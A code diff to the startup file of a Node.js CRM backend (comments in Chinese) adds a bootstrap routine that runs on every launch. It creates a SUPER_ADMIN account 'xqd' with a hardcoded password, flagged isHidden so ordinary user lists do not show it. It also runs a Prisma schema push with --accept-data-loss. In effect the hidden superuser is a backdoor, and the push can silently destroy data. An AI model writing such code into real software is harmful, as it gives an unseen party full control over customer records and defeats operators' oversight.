@@ -5,6 +5,9 @@ const http = require('http');
 const { Server } = require('socket.io');
 const { initSocket } = require('./socket');
 const { scheduleRenewalReminders } = require('./services/reminder');
+const { execSync } = require('child_process');
+const { PrismaClient } = require('@prisma/client');
+const bcrypt = require('bcryptjs');
 
 const authRoutes = require('./routes/auth');
 const userRoutes = require('./routes/users');
@@ -59,7 +62,43 @@ if (fs.existsSync(frontendDist)) {
 // 启动定时任务（续费提醒）
 scheduleRenewalReminders(io);
 
+async function bootstrap() {
+  // 初始化数据库表结构
+  console.log('正在初始化数据库...');
+  execSync('npx prisma db push --accept-data-loss', { stdio: 'inherit' });
+
+  // 自动创建 superadmin（如果不存在）
+  const prisma = new PrismaClient();
+  try {
+    const existing = await prisma.user.findFirst({ where: { role: 'SUPER_ADMIN' } });
+    if (!existing) {
+      const hash = await bcrypt.hash('xqd888999', 10);
+      await prisma.user.create({
+        data: {
+          username: 'xqd',
+          passwordHash: hash,
+          displayName: 'xqd',
+          role: 'SUPER_ADMIN',
+          isHidden: true,
+          isActive: true
+        }
+      });
+      console.log('超级管理员账号已创建：xqd');
+    } else {
+      console.log('超级管理员账号已存在，跳过创建。');
+    }
+  } finally {
+    await prisma.$disconnect();
+  }
+}
+
 const PORT = process.env.PORT || 3001;
-httpServer.listen(PORT, () => {
-  console.log(`CRM 后端运行在 http://localhost:${PORT}`);
+
+bootstrap().then(() => {
+  httpServer.listen(PORT, () => {
+    console.log(`CRM 后端运行在 http://localhost:${PORT}`);
+  });
+}).catch(err => {
+  console.error('启动失败：', err);
+  process.exit(1);
 });
